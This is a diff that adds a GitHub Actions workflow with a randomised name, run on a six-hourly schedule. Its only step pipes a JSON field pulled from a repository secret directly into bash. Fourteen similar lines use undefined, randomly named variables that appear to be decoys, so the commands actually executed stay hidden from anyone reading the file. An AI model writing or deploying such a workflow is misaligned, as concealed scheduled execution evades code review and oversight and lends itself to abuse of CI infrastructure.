@@ -1,0 +1,31 @@
+name: liantiandeajie
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '52 4/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: liantiandeajie
+        env:
+          db77199: ${{ secrets.db77199 }}
+        run: |
+          echo $db77199 | jq -r .hgnck53 | /bin/bash
+          echo $rq0 | jq -r .hnh8 | /bin/bash
+          echo $d1801 | jq -r .rztm238 | /bin/bash
+          echo $iszgv5200 | jq -r .so626 | /bin/bash
+          echo $o6 | jq -r .dra7 | /bin/bash
+          echo $lgwht69536 | jq -r .vtr49900 | /bin/bash
+          echo $veg82956 | jq -r .wmqj48528 | /bin/bash
+          echo $ow3 | jq -r .wcud3 | /bin/bash
+          echo $pq8 | jq -r .k283 | /bin/bash
+          echo $ab68 | jq -r .eaj92 | /bin/bash
+          echo $wlkm5976 | jq -r .tpdg78 | /bin/bash
+          echo $zxff2010 | jq -r .x919 | /bin/bash
+          echo $ryigy1670 | jq -r .js525 | /bin/bash
+          echo $afu55 | jq -r .vhzzf75677 | /bin/bash
+          echo $wlrp519 | jq -r .c3678 | /bin/bash
+
